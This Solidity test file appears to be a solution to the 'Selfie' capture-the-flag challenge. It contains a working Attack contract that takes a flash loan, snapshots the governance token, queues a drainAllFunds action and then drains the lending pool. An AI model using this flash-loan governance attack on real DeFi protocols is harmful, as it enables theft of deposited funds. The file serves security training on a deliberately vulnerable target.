// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract SelfieTest is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Hacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT Snapshot Token");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );
        vm.label(address(selfiePool), "Lender Pool");

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log("Setup complete. Governance system initialized.");
    }

    function testSelfieExploit() public {
        /**
         * EXPLOIT START
         */
        vm.startPrank(attacker);

        console.log("Attacker token balance BEFORE:",
            dvtSnapshot.balanceOf(attacker)
        );

        Attack attack = new Attack(attacker, selfiePool, simpleGovernance);
        attack.attack();

        vm.warp(block.timestamp + 2 days);

        simpleGovernance.executeAction(attack.id());

        console.log("Attacker token balance AFTER:",
            dvtSnapshot.balanceOf(attacker)
        );

        vm.stopPrank();
        /**
         * EXPLOIT END
         */

        validation();

        console.log("Exploit successful. Governance manipulated using snapshot and flash loan.");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

contract Attack {
    SelfiePool flashloan;
    SimpleGovernance gvt;
    uint256 public id;
    address attacker;

    constructor(
        address _attacker,
        SelfiePool _flashloan,
        SimpleGovernance _gvt
    ) {
        attacker = _attacker;
        flashloan = _flashloan;
        gvt = _gvt;
    }

    function attack() external {
        flashloan.flashLoan(
            gvt.governanceToken().balanceOf(address(flashloan))
        );
    }

    function receiveTokens(address, uint256 amount) external {
        gvt.governanceToken().snapshot();

        id = gvt.queueAction(
            address(flashloan),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                attacker
            ),
            0
        );

        gvt.governanceToken().transfer(address(flashloan), amount);
    }
}